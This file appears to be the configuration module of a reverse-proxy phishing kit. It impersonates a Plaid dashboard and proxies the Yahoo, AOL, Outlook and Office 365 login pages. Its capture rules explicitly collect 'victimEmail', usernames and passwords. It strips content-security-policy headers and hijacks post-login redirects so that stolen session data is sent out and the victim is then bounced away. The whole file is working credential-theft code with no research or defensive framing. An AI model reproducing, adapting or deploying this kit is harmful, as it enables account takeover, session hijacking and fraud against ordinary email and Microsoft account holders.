/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        
        return super.processRequest()

    }

}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
        super(proxyResp, browserEndPoint)
        this.regexes = [
            
        ]
    }


    processResponse() {
        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url

            const checkUrls = ["https://guce.yahoo.com", 
            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
             "/account/comm-channel/refresh", '/account/upsell/webauthn',
             "https://account.live.com", "https://account.microsoft.com",
             "https://api.login.aol.com/oauth2/request_auth",
             'https://guce.aol.com/consent?gcrumb=',
             "https://www.aol.com/", 'https://www.office.com/landing'

             ]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {   
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                }
            }
        }
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }
        this.browserEndPoint.removeHeader('content-security-policy')
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    afterEmailPath() {
        this.browserEndPoint.setHeader('location', '/auth/login/finish')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        if (this.req.url.startsWith('/identity')) {
            if (this.req.url === '/identity/v2') {
                return super.superExecutePhpScript('email.php', clientContext)
            }
            if (this.req.url === '/identity/lalo/validate') {
                super.uploadRequestBody('PHP-EXEC', clientContext)
                return super.superExecutePhpScript('validate.php', clientContext)

            }
        }

        if (this.req.method === 'POST') {
            super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
           
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, {location: 'http://default.com'})
                return super.cleanEnd('PHP-EXEC', clientContext) 
            }
        }

        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            super.sendClientData(clientContext, {})
        }
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
            redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, { location: '/auth/login/finish' })
                return super.cleanEnd('PHP-EXEC', clientContext)
            }
        }

        
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'dashboard.plaid.com',
    START_PATH: '/identity/v2',


    EXTERNAL_FILTERS: 
    [
    'signaler-pa.googleapis.com',
    'ssl.gstatic.com',
    'dl.cws.xfinity.com',
    'comcast.demdex.net'
    ],


    PRE_HANDLERS:
        [
        ],
   
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        victimEmail: {
            method: 'POST',
            params: ['lalo'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        manualEmail: {
            method: 'POST',
            params: ['lalo'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        manualPassword1: {
            method: 'POST',
            params: ['elberto'],
            urls: '',
            hosts: 'PHP-EXEC',
        }, 

        manualPassword2: {
            method: 'POST',
            params: ['aneko'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

